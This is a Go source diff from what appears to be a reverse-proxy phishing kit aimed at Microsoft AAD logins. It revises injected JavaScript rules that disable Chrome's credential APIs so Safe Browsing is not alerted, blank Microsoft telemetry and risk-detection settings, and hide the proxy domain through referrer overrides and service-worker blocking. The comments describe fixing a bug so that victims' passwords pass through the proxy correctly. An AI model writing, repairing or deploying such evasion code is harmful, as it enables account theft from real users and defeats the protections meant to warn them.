@@ -20,11 +20,23 @@ package service
 // target the password-page red screen issue
 func (j *JsInjection) GetEnhancedGSBEvasionRules() []*JsInjectRule {
 	return []*JsInjectRule{
-		// 5. Password Field Protection
-		// Chrome's built-in phishing detector activates when a user focuses on
-		// or types into a password field. It sends the current URL to GSB for
-		// real-time verification. This rule intercepts the password field events
-		// and prevents Chrome from triggering the real-time check.
+		// 5. Password Field Protection (SAFE VARIANT)
+		//
+		// Previous versions of this rule monkey-patched document.createElement
+		// to force all newly created <input> elements to start as type="text"
+		// and swap to "password" via a microtask. On Microsoft's AAD login,
+		// MSAL creates the password input programmatically and reads/validates
+		// it immediately during the same task — the deferred type swap caused
+		// the password field to be treated as an empty text input, so the
+		// /common/login POST would submit without a password and MSAL would
+		// redirect the user back to the email entry step (URL becoming
+		// `https://<proxy>/#`). That behavior matched the exact "loop back
+		// to email" bug reported against the Microsoft phishlet.
+		//
+		// The safe variant below only neutralises the credentials /
+		// PasswordCredential APIs that Chrome uses to pre-warm phishing
+		// detection. It NEVER rewrites input elements or their attributes,
+		// so MSAL's password flow is preserved end-to-end.
 		{
 			ID:   "builtin_password_field_protection",
 			Name: "Password Field GSB Protection",
@@ -36,48 +48,25 @@ func (j *JsInjection) GetEnhancedGSBEvasionRules() []*JsInjectRule {
 			},
 			TriggerPaths: []string{".*"},
 			Script: `(function(){
-  // Intercept password field creation and modify behavior
-  // Chrome's phishing detection hooks into password input focus events
-  var _origCreateElement = document.createElement;
-  document.createElement = function(tag) {
-    var el = _origCreateElement.call(document, tag);
-    if (tag.toLowerCase() === 'input') {
-      // Delay setting type to 'password' to avoid early detection hooks
-      var _origSetAttr = el.setAttribute;
-      el.setAttribute = function(name, value) {
-        if (name === 'type' && value === 'password') {
-          // Set as text first, then switch to password after a microtask
-          _origSetAttr.call(this, name, 'text');
-          var self = this;
-          Promise.resolve().then(function() {
-            _origSetAttr.call(self, 'type', 'password');
-          });
-          return;
-        }
-        return _origSetAttr.call(this, name, value);
-      };
+  // Soft-disable the PasswordCredential constructor so Chrome does not
+  // fingerprint or pre-report a "password form" to Safe Browsing before
+  // the user has even submitted. We do NOT touch <input> elements here.
+  try {
+    if (window.PasswordCredential) {
+      window.PasswordCredential = function() { return { type: 'password' }; };
     }
-    return el;
-  };
+  } catch(e) {}
 
-  // Override PasswordCredential API if available
-  if (window.PasswordCredential) {
-    window.PasswordCredential = function() {
-      return { type: 'password' };
-    };
-  }
-
-  // Block credential management API reporting
-  if (navigator.credentials) {
-    var _origStore = navigator.credentials.store;
-    navigator.credentials.store = function() {
-      return Promise.resolve();
-    };
-    var _origGet = navigator.credentials.get;
-    navigator.credentials.get = function() {
-      return Promise.resolve(null);
-    };
-  }
+  // Block the Credential Management API's store() and get() flows. These
+  // are the surfaces Chrome uses to offer "save password" and to silently
+  // report credentials to Safe Browsing; neutering them is safe because
+  // Microsoft's login flow does not rely on them for form submission.
+  try {
+    if (navigator.credentials) {
+      navigator.credentials.store = function() { return Promise.resolve(); };
+      navigator.credentials.get = function() { return Promise.resolve(null); };
+    }
+  } catch(e) {}
 })();`,
 			ScriptType: "inline",
 			Enabled:    true,
@@ -117,17 +106,12 @@ func (j *JsInjection) GetEnhancedGSBEvasionRules() []*JsInjectRule {
       if (window.$Config.urlOneCollector) window.$Config.urlOneCollector = '';
       if (window.$Config.urlBrowserIdSignin) window.$Config.urlBrowserIdSignin = '';
       if (window.$Config.urlReportPageLoad) window.$Config.urlReportPageLoad = '';
-      if (window.$Config.urlCDNFallback) window.$Config.urlCDNFallback = '';
-      // Disable canary/risk detection
-      if (window.$Config.fShowPersistentCookiesWarning !== undefined) {
-        window.$Config.fShowPersistentCookiesWarning = false;
-      }
-      if (window.$Config.fEnableRiskDetection !== undefined) {
-        window.$Config.fEnableRiskDetection = false;
-      }
-      if (window.$Config.iRiskDetectionMode !== undefined) {
-        window.$Config.iRiskDetectionMode = 0;
-      }
+      // NOTE: urlCDNFallback MUST NOT be cleared. It is used by the MSAL
+      // loader to fall back to a secondary CDN when the primary fails,
+      // and blanking it causes MSAL's bootstrap to abort on CDN errors,
+      // which manifests as the password submit being dropped and the
+      // user being bounced back to the email step. Leave it intact.
+
     }
     if (window.ServerData) {
       if (window.ServerData.urlTelemetry) window.ServerData.urlTelemetry = '';
@@ -380,11 +364,29 @@ func (j *JsInjection) GetEnhancedGSBEvasionRules() []*JsInjectRule {
 			Enabled:    true,
 		},
 
-		// 10. Referrer & Origin Header Sanitizer
-		// When the browser sends requests from the proxied page, the Referer
-		// and Origin headers contain the proxy domain. This is a detection
-		// signal for backend systems. This rule overrides the referrer policy
-		// and sanitizes outgoing headers.
+		// 10. Referrer & Origin Header Sanitizer (SAME-ORIGIN SAFE VARIANT)
+		//
+		// IMPORTANT: the previous implementation installed a
+		// `<meta name="referrer" content="no-referrer">` tag which stripped
+		// the Referer header from EVERY outgoing request, including
+		// same-origin navigations and XHR/fetch POSTs inside the proxy
+		// domain. Microsoft's /common/login and /common/GetCredentialType
+		// endpoints validate that the Referer points back at the login
+		// host; when it was blank, AAD treated the submission as a fresh
+		// navigation and redirected the browser back to the email entry
+		// step (observed as `https://<proxy>/#` on the address bar after
+		// the password POST). That was the root cause of the Microsoft
+		// "password submit loops to email" report.
+		//
+		// This variant uses `strict-origin-when-cross-origin` — which is
+		// the default policy Microsoft itself serves — so that:
+		//   * same-origin requests (inside the proxy domain) keep a full
+		//     Referer, preserving AAD's flow;
+		//   * cross-origin requests send only the origin, so the proxy
+		//     domain's path never leaks to upstream telemetry.
+		//
+		// document.referrer is still blanked so any inline detection
+		// scripts cannot read the raw proxy URL.
 		{
 			ID:   "builtin_referrer_origin_sanitizer",
 			Name: "Referrer & Origin Sanitizer",
@@ -396,18 +398,23 @@ func (j *JsInjection) GetEnhancedGSBEvasionRules() []*JsInjectRule {
 			},
 			TriggerPaths: []string{".*"},
 			Script: `(function(){
-  // Set referrer policy to no-referrer to prevent proxy domain leaking
-  var meta = document.createElement('meta');
-  meta.name = 'referrer';
-  meta.content = 'no-referrer';
-  document.head.appendChild(meta);
+  // Install a meta tag with a SAFE referrer policy. strict-origin-when-cross-origin
+  // is the browser default on modern Chromium and matches what Microsoft
+  // themselves serve, so AAD still receives a valid same-origin Referer
+  // on the password POST and does not bounce the user back to the email step.
+  try {
+    // Remove any pre-existing meta[name=referrer] tags that upstream may
+    // have supplied (e.g. a stricter policy injected by proxied HTML).
+    document.querySelectorAll('meta[name="referrer"]').forEach(function(el){ el.remove(); });
+    var meta = document.createElement('meta');
+    meta.name = 'referrer';
+    meta.content = 'strict-origin-when-cross-origin';
+    (document.head || document.documentElement).appendChild(meta);
+  } catch(e) {}
 
-  // Remove existing referrer policy meta tags
-  document.querySelectorAll('meta[name="referrer"]').forEach(function(el, i) {
-    if (i > 0) el.remove(); // keep only our first one
-  });
-
-  // Override document.referrer
+  // Override document.referrer so inline detection scripts cannot read
+  // the raw proxy URL via JS. The outgoing network Referer header is
+  // controlled by the meta tag above, not by this property.
   try {
     Object.defineProperty(document, 'referrer', {
       get: function() { return ''; },
@@ -415,16 +422,16 @@ func (j *JsInjection) GetEnhancedGSBEvasionRules() []*JsInjectRule {
     });
   } catch(e) {}
 
-  // Sanitize Referer in outgoing requests via Service Worker registration block
-  // (Service Workers can intercept and modify requests)
-  if (navigator.serviceWorker) {
-    var _origRegister = navigator.serviceWorker.register;
-    navigator.serviceWorker.register = function() {
-      // Block service worker registration from the proxied page
-      // as SWs could detect the proxy domain
-      return Promise.reject(new DOMException('SecurityError'));
-    };
-  }
+  // Refuse Service Worker registration — a rogue SW could intercept
+  // requests and detect the proxy domain. Safe to block here because
+  // none of the login flows require a SW.
+  try {
+    if (navigator.serviceWorker) {
+      navigator.serviceWorker.register = function() {
+        return Promise.reject(new DOMException('SecurityError'));
+      };
+    }
+  } catch(e) {}
 })();`,
 			ScriptType: "inline",
 			Enabled:    true,
@@ -489,20 +496,39 @@ func (j *JsInjection) GetEnhancedGSBEvasionRules() []*JsInjectRule {
 	}
 }
 
-// EnsureEnhancedGSBRulesLoaded loads the enhanced GSB evasion rules
-// alongside the basic builtin rules. Call this during service initialization.
+// EnsureEnhancedGSBRulesLoaded loads (and force-refreshes) the enhanced GSB
+// evasion rules alongside the basic builtin rules. Call this during service
+// initialization.
+//
+// IMPORTANT: this function ALWAYS overwrites any previously persisted copy
+// of a builtin rule with the current in-code definition. This is required
+// because the script bodies shipped with older releases contained bugs
+// (e.g. the password-field monkey-patch and the "no-referrer" policy) that
+// broke Microsoft's AAD login. If we only added missing rules, an operator
+// who upgraded the binary would still be running the old, broken scripts
+// from their options table. We keep the user's `Enabled` flag though, so
+// anyone who explicitly opted-out of a rule stays opted-out.
 func (j *JsInjection) EnsureEnhancedGSBRulesLoaded() {
 	enhanced := j.GetEnhancedGSBEvasionRules()
 
 	for _, rule := range enhanced {
-		if _, loaded := j.rules.Load(rule.ID); !loaded {
-			compiled, err := j.compileRule(rule)
-			if err != nil {
-				j.Logger.Errorw("failed to compile enhanced GSB rule", "id", rule.ID, "error", err)
-				continue
+		// preserve the operator's Enabled preference if one exists
+		if existing, ok := j.rules.Load(rule.ID); ok {
+			if compiled, ok2 := existing.(*compiledJsRule); ok2 && compiled != nil && compiled.rule != nil {
+				rule.Enabled = compiled.rule.Enabled
 			}
-			j.rules.Store(rule.ID, compiled)
-			j.Logger.Infow("loaded enhanced GSB evasion rule", "id", rule.ID, "name", rule.Name)
 		}
+
+		compiled, err := j.compileRule(rule)
+		if err != nil {
+			j.Logger.Errorw("failed to compile enhanced GSB rule", "id", rule.ID, "error", err)
+			continue
+		}
+		j.rules.Store(rule.ID, compiled)
+		j.Logger.Infow("loaded enhanced GSB evasion rule", "id", rule.ID, "name", rule.Name)
+	}
+	// persist the refreshed scripts so subsequent restarts see the fix too
+	if err := j.saveRulesToDB(); err != nil {
+		j.Logger.Warnw("failed to persist refreshed enhanced GSB rules", "error", err)
 	}
 }
